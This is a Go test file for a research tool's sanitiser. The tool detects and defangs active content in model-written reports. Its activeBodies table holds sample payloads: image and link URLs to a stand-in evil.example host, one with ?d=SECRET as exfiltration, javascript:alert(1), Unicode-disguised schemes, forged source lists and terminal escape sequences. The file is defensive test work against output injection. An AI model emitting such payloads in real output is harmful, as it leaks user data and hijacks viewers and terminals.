package research

import (
	"context"
	"fmt"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/MatrixMagician/VillaStraylight/internal/grounding"
)

// activeBodies are model-written bodies that carry something a viewer, an
// autolinker or a Markdown parser could act on. The first three are the shapes a
// regex sanitiser got wrong in review: an escaped bracket, a container-marked
// heading, and a scheme glued to emphasis. The rest are the plain shapes and the
// Unicode disguises.
var activeBodies = map[string]string{
	"escaped bracket link":       `Result \[x\](//evil.example/x) [1].`,
	"protocol relative":          "See //evil.example/x for more [1].",
	"underscore autolink":        "See _https://evil.example/x_ [1].",
	"underscore www":             "See _www.evil.example_ [1].",
	"emphasis autolink":          "See *https://evil.example/x* [1].",
	"image":                      "Result ![chart](https://evil.example/p?d=SECRET) here [1].",
	"inline link":                "See [the docs](https://evil.example/x) [1].",
	"reference link":             "See [the docs][ref] [1].\n\n[ref]: https://evil.example/x",
	"autolink":                   "See <https://evil.example/x> [1].",
	"bare url":                   "See https://evil.example/x?d=SECRET now [1].",
	"www url":                    "See www.evil.example/x now [1].",
	"raw img":                    `Result <img src="x"> [1].`,
	"raw anchor":                 `Result <a href="x">click</a> [1].`,
	"html comment":               "Result <!-- hidden --> [1].",
	"closing tag":                "Result </div> [1].",
	"javascript":                 "Run javascript:alert(1) [1].",
	"zero width in scheme":       "See h\u200bttps://evil.example/x [1].",
	"zero width in www":          "See w\u200bww.evil.example [1].",
	"fullwidth scheme":           "See ｈｔｔｐｓ://evil.example/x [1].",
	"fullwidth slashes":          "See https：／／evil.example/x [1].",
	"bidi override":              "See \u202ehttps://evil.example/x [1].",
	"citation as link":           "Claim [1](https://evil.example/x).",
	"citation as definition":     "Claim [1].\n\n[1]: https://evil.example/x",
	"forged list in a container": "Fine [1].\n\n> ## Sources\n> 1. https://evil.example/",
}

// TestInspectFlagsEveryActiveShape guards the primary control: whatever hides it,
// a body that carries a scheme, a www. address, a //host, a tag, a link or image
// or a definition is reported, after the same NFKC normalisation the page guard
// uses. Detection looks at no word boundary and no Markdown structure.
func TestInspectFlagsEveryActiveShape(t *testing.T) {
	for name, body := range activeBodies {
		t.Run(name, func(t *testing.T) {
			if _, kinds := inspect(body); len(kinds) == 0 {
				t.Errorf("nothing flagged in %q", body)
			}
		})
	}
}

// TestInspectLeavesCleanProseAlone guards against a flag that fires on ordinary
// prose: citations, parentheses, a lone slash and a sentence with a colon.
func TestInspectLeavesCleanProseAlone(t *testing.T) {
	body := "ROCm 7.2 added gfx1151 [1][2]. Known issues remain (see above) [2].\nNote: it/they differ. A 5 / 3 ratio. Use x > 5 or y < 2.\n- a bullet [1]"
	norm, kinds := inspect(body)
	if len(kinds) != 0 || norm != body {
		t.Errorf("clean body changed or flagged: %q %v", norm, kinds)
	}
}

// TestDefangBreaksEverythingTheDetectorFlags guards the belt: after defanging, no
// scheme separator, no pair of slashes, no www. host, no link or image or
// definition syntax and no tag opener is left, whatever the input.
func TestDefangBreaksEverythingTheDetectorFlags(t *testing.T) {
	bad := regexp.MustCompile(`(?i)//|www\.|(?:^|[^\\])\][(:]|!\[|(?:^|[^\\])<[a-z/!?]`)
	for name, body := range activeBodies {
		t.Run(name, func(t *testing.T) {
			norm, _ := inspect(body)
			out := defang(norm)
			if m := bad.FindString(out); m != "" {
				t.Errorf("%q survived defanging:\n%s", m, out)
			}
			if _, kinds := inspect(out); slices.Contains(kinds, "a URL (scheme://)") || slices.Contains(kinds, "a www. address") {
				t.Errorf("the defanged text still reads as a URL: %v\n%s", kinds, out)
			}
		})
	}
}

// TestDefangEscapesBackslashesFirst guards the differential behind the first
// bypass: a backslash in the input is doubled before any other escape is added, so
// a model-written backslash cannot cancel one of villa's. `\[x\]` therefore leaves
// the bracket escaped by villa's own backslash, with the model's backslash literal.
func TestDefangEscapesBackslashesFirst(t *testing.T) {
	if got, want := defang(`\[x\](y)`), `\\\[x\\\](y)`; got != want {
		t.Errorf("defang = %q, want %q", got, want)
	}
	if got, want := defang(`a \ b`), `a \\ b`; got != want {
		t.Errorf("defang = %q, want %q", got, want)
	}
}

// TestDefangKeepsCitations guards that [n] survives, adjacent ones included, and
// that a citation that would read as a link destination or a definition does not.
func TestDefangKeepsCitations(t *testing.T) {
	body := "Added gfx1151 [1][2]. Issues remain (see above) [2]."
	if got := defang(body); got != body {
		t.Errorf("defang(%q) = %q", body, got)
	}
	if got := defang("x [1](y) and [2]: z"); got != `x \[1\](y) and \[2\]: z` {
		t.Errorf("a citation followed by ( or : must be escaped, got %q", got)
	}
}

// TestRenderIsPlainTextWithAnUnforgeableList guards the list: villa's sources come
// after a delimiter line carrying a per-report token, once, at the end, and no
// heading or container marker in the body can stand in for it.
func TestRenderIsPlainTextWithAnUnforgeableList(t *testing.T) {
	srcs := []Source{{N: 1, URL: "https://docs.example/rocm", Title: "ROCm docs"}, {N: 2, URL: "https://x.example/", Flagged: true, Rules: []string{"override"}}}
	for _, body := range []string{
		"Fine [1].",
		"Fine [1].\n\n## Sources\n\n1. Trusted Corp",
		"Fine [1].\n\n> ## Sources\n> 1. Trusted Corp",
		"Fine [1].\n\n- ## Sources\n  1. ## Sources",
		"Fine [1].\n\nSources\n-------",
	} {
		report := render("What changed?", defang(body), "tok-ab12", srcs)
		if n := strings.Count(report, "villa sources tok-ab12"); n != 1 {
			t.Errorf("%d delimiters in:\n%s", n, report)
		}
		before, after, _ := strings.Cut(report, "villa sources tok-ab12")
		if strings.Contains(after, "Trusted Corp") || !strings.Contains(before, "Fine [1]") {
			t.Errorf("model text on the wrong side of the delimiter:\n%s", report)
		}
		for _, want := range []string{"1. https://docs.example/rocm ROCm docs", "2. https://x.example/ (flagged by websafe: override)"} {
			if !strings.Contains(after, want) {
				t.Errorf("list lacks %q:\n%s", want, after)
			}
		}
		if strings.Contains(report, "```") || strings.Contains(report, "# What") {
			t.Errorf("the report must be plain text, not Markdown:\n%s", report)
		}
	}
}

// TestRunFlagsEveryActiveBody guards the whole path: a body that carries any of
// the shapes ends the task flagged, naming what was found, with nothing live in the
// written body and the audit shown the defanged text.
func TestRunFlagsEveryActiveBody(t *testing.T) {
	for name, body := range activeBodies {
		t.Run(name, func(t *testing.T) {
			f := newFake(t)
			f.report = func() (string, error) { return body, nil }
			var audited string
			f.audit = func(doc grounding.Document, _ []grounding.Source) grounding.DocumentReport {
				audited = doc.Content
				return grounding.DocumentReport{Path: doc.Path, Checked: true, Claims: 1}
			}
			res := run(f, Budget{Rounds: 1})
			if res.Outcome != Flagged || !strings.Contains(res.Reason, "defanged") {
				t.Fatalf("outcome = %v (%q), want flagged naming what was defanged", res.Outcome, res.Reason)
			}
			written, _, _ := strings.Cut(res.Report, "villa sources "+testToken)
			if strings.Contains(written, "://") || strings.Contains(audited, "://") {
				t.Errorf("a scheme separator reached the report or the audit:\n%s\n---\n%s", written, audited)
			}
			if res.Grounding.Unsupported == nil {
				t.Error("each finding must be in the grounding result")
			}
		})
	}
}

// TestRunFlagsABodyThatContainsTheDelimiterToken guards the list's other lock: a
// body carrying the token is refused as forged even though it could not have
// guessed it.
func TestRunFlagsABodyThatContainsTheDelimiterToken(t *testing.T) {
	f := newFake(t)
	f.report = func() (string, error) { return "Fine [1].\n" + testToken + "\n1. Evil", nil }
	res := run(f, Budget{Rounds: 1})
	if res.Outcome != Flagged || !strings.Contains(res.Reason, "delimiter") {
		t.Errorf("outcome = %v (%q), want flagged for the delimiter", res.Outcome, res.Reason)
	}
	if n := strings.Count(res.Report, "villa sources "+testToken); n != 1 || strings.Count(res.Report, testToken) != 1 {
		t.Errorf("the token must appear once, on villa's delimiter line:\n%s", res.Report)
	}
}

// TestRunFailsWhenNoTokenCanBeMade guards fail-closed: with no way to make the
// per-report delimiter the report is not written.
func TestRunFailsWhenNoTokenCanBeMade(t *testing.T) {
	f := newFake(t)
	f.tokenErr = fmt.Errorf("no entropy")
	if res := run(f, Budget{Rounds: 1}); res.Outcome != Failed || res.Report != "" {
		t.Errorf("outcome = %v report = %q, want failed with no report", res.Outcome, res.Report)
	}
}

// TestRunKeepsTerminalControlsOutOfEverythingItPrints guards the terminal: the
// report and the record are printed by `villa research` and `villa task show`, and
// an escape sequence in model output or in a page title would be interpreted there.
// NFKC and the page guard strip format characters, not the C0 and C1 controls.
func TestRunKeepsTerminalControlsOutOfEverythingItPrints(t *testing.T) {
	f := newFake(t)
	f.report = func() (string, error) { return "Fine \x1b[2J\x1b]0;owned\x07 text [1]\u009b31m.", nil }
	inner := f.fetch
	f.fetch = func(ctx context.Context, urls []string) ([]Page, error) {
		pages, _ := inner(ctx, urls)
		for i := range pages {
			pages[i].Title = "T\x1b[31mitle"
			pages[i].URL += "\x1b[1m"
		}
		return pages, nil
	}
	res := run(f, Budget{Rounds: 1})
	var all strings.Builder
	all.WriteString(res.Report + strings.Join(f.narrated, "\n"))
	for _, s := range res.Sources {
		all.WriteString(s.Title + s.URL)
	}
	for _, r := range all.String() {
		if r != '\n' && r != '\t' && (r < 0x20 || (r >= 0x7f && r <= 0x9f)) {
			t.Fatalf("control character %U reached something printed:\n%q", r, all.String())
		}
	}
}
